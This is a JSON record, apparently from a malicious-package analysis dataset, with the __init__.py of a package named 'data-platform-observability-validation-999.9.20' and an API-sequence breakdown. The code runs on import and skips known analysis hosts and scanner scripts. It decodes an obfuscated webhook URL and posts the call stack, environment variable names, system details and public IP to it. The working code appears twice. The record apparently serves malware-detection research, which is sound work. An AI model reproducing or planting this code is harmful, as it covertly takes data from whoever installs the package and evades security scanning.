[
  {
    "pyfile": "__init__.py",
    "code_snippet": "import os\nimport json\nimport traceback\nimport base64\nfrom urllib import request\n\ndef save_some_stuff():\n    known_bots_nodename = [\"lili-pc\"]\n    known_bots_programs = [\"analyze-python.py\", \"detect.py\"]\n    try:\n        if os.uname().nodename in known_bots_nodename:\n            return\n        if traceback.extract_stack()[0].filename.split(\"/\")[-1] in known_bots_programs:\n            return\n        _save_some_stuff()\n    except:\n        return\n    \ndef _save_some_stuff():\n    url = (\"aHR0cHM6Ly9ob29rcy5zbGF\"\n           \"jay5jb20vc2VydmljZXMvVDAzRjRCV\"\n           \"FNLL0IwNktYVVI5RDJBL05mcUdqT1E3SGxTZ\"\n           \"0sxenZHSEJvbXdCMQ==\")\n    url = base64.b64decode(url).decode('utf-8')\n    data = (\n        \"============================================\\n\"\n        f\"\\t stack={traceback.extract_stack()}\\n\\n\"\n        f\"\\t env={dict(os.environ).keys()}\\n\\n\"\n        f\"\\t uname={os.uname()}\\n\\n\"\n        f\"\\t ip={request.urlopen('https://ipinfo.io/ip').read().decode('utf8')}\"\n    )\n    body = {\"text\": data}\n    data = json.dumps(body)\n    data = data.encode()\n    req =  request.Request(url)\n    req.add_header('Content-Type', 'application/json')\n    request.urlopen(req, data=data)\n\nsave_some_stuff()",
    "pattern_analysis": {
      "api_sequence": [
        "os.uname",
        "traceback.extract_stack",
        "os.uname",
        "traceback.extract_stack",
        "os.environ",
        "os.uname",
        "request.urlopen",
        "request.urlopen.read",
        "base64.b64decode",
        "json.dumps",
        "request.Request",
        "request.Request.add_header",
        "request.urlopen"
      ],
      "api_sequence_with_args": [
        "os.uname()",
        "traceback.extract_stack()",
        "os.uname()",
        "traceback.extract_stack()",
        "os.environ",
        "os.uname()",
        "request.urlopen('https://ipinfo.io/ip')",
        "request.urlopen('https://ipinfo.io/ip').read()",
        "base64.b64decode(url)",
        "json.dumps(body)",
        "request.Request(url)",
        "request.Request.add_header('Content-Type', 'application/json')",
        "request.urlopen(req, data=data)"
      ],
      "mapped_sequence": [
        {
          "api_name": "os.uname",
          "id": "get_os_info",
          "description": "Retrieves operating system information",
          "first_id": "information_gathering",
          "second_id": "system_information_collection",
          "third_id": "os_information"
        },
        {
          "api_name": "traceback.extract_stack",
          "id": "extract_call_stack",
          "description": "Extracts current call stack as FrameSummary objects",
          "first_id": "data_transformation_processing",
          "second_id": "collection_operations",
          "third_id": "iterator_operations"
        },
        {
          "api_name": "os.uname",
          "id": "get_os_info",
          "description": "Retrieves operating system information",
          "first_id": "information_gathering",
          "second_id": "system_information_collection",
          "third_id": "os_information"
        },
        {
          "api_name": "traceback.extract_stack",
          "id": "extract_call_stack",
          "description": "Extracts current call stack as FrameSummary objects",
          "first_id": "data_transformation_processing",
          "second_id": "collection_operations",
          "third_id": "iterator_operations"
        },
        {
          "api_name": "os.environ",
          "id": "get_env_vars",
          "description": "Retrieves environment variables mapping",
          "first_id": "system_operations",
          "second_id": "system_environment_operations",
          "third_id": "environment_information"
        },
        {
          "api_name": "os.uname",
          "id": "get_os_info",
          "description": "Retrieves operating system information",
          "first_id": "information_gathering",
          "second_id": "system_information_collection",
          "third_id": "os_information"
        },
        {
          "api_name": "urllib.request.urlopen",
          "id": "open_url_get",
          "description": "Opens URL with GET parameters",
          "first_id": "basic_network_operations",
          "second_id": "http_requests",
          "third_id": "request_sending"
        },
        {
          "api_name": "urllib.request.urlopen.read",
          "id": "read_response_bytes",
          "description": "Reads response body as bytes",
          "first_id": "basic_network_operations",
          "second_id": "http_requests",
          "third_id": "response_processing"
        },
        {
          "api_name": "base64.b64decode",
          "id": "decode_base64_to_bytes",
          "description": "Decodes base64-encoded string to bytes",
          "first_id": "data_transformation_processing",
          "second_id": "data_encoding",
          "third_id": "base_encoding"
        },
        {
          "api_name": "json.dumps",
          "id": "serialize_to_json",
          "description": "Serializes Python object to JSON string",
          "first_id": "data_transformation_processing",
          "second_id": "data_encoding",
          "third_id": "specific_format_encoding"
        },
        {
          "api_name": "urllib.request.Request",
          "id": "create_http_request",
          "description": "Creates HTTP request object with specified URL, data, and headers",
          "first_id": "basic_network_operations",
          "second_id": "http_requests",
          "third_id": "request_creation"
        },
        {
          "api_name": "urllib.request.Request.add_header",
          "id": "add_http_header",
          "description": "Adds HTTP header to request object",
          "first_id": "basic_network_operations",
          "second_id": "http_requests",
          "third_id": "request_configuration"
        },
        {
          "api_name": "urllib.request.urlopen",
          "id": "open_url_post",
          "description": "Opens URL with POST data",
          "first_id": "basic_network_operations",
          "second_id": "http_requests",
          "third_id": "request_sending"
        }
      ],
      "contextual_code": "import os\nimport json\nimport traceback\nimport base64\nfrom urllib import request\n\ndef save_some_stuff():\n    known_bots_nodename = [\"lili-pc\"]\n    known_bots_programs = [\"analyze-python.py\", \"detect.py\"]\n    try:\n        if os.uname().nodename in known_bots_nodename:\n            return\n        if traceback.extract_stack()[0].filename.split(\"/\")[-1] in known_bots_programs:\n            return\n        _save_some_stuff()\n    except:\n        return\n\ndef _save_some_stuff():\n    url = (\"aHR0cHM6Ly9ob29rcy5zbGF\"\n           \"jay5jb20vc2VydmljZXMvVDAzRjRCV\"\n           \"FNLL0IwNktYVVI5RDJBL05mcUdqT1E3SGxTZ\"\n           \"0sxenZHSEJvbXdCMQ==\")\n    url = base64.b64decode(url).decode('utf-8')\n    data = (\n        \"============================================\\n\"\n        f\"\\t stack={traceback.extract_stack()}\\n\\n\"\n        f\"\\t env={dict(os.environ).keys()}\\n\\n\"\n        f\"\\t uname={os.uname()}\\n\\n\"\n        f\"\\t ip={request.urlopen('https://ipinfo.io/ip').read().decode('utf8')}\"\n    )\n    body = {\"text\": data}\n    data = json.dumps(body)\n    data = data.encode()\n    req =  request.Request(url)\n    req.add_header('Content-Type', 'application/json')\n    request.urlopen(req, data=data)"
    }
  },
  {
    "metadata": {
      "package_name": "data-platform-observability-validation-999.9.20"
    }
  }
]